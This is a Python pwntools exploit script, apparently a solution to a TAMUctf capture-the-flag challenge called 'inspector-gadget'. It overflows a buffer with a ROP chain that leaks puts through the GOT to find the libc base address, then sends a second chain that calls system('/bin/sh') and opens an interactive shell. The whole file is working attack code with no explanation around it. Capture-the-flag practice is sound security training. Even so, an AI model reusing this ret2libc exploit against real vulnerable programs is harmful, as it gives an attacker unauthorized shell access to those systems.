from pwn import *

# p = remote("tamuctf.com", 443, ssl=True, sni="inspector-gadget")
p = process("./inspector-gadget")
elf = ELF('./inspector-gadget')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

payload = b"A"*24
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.main)

p.sendline(payload)
p.recvline()
p.recvline()
leak = u64(p.recvline().strip().ljust(8,b'\0'))
p.recvline()

log.info(f'Gets leak => {hex(leak)}')
libc.address = leak - libc.symbols.puts
log.info(f'Libc base => {hex(libc.address)}')

payload = b"A"*24
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)

p.sendline(payload)
# p.recvline()


p.interactive()
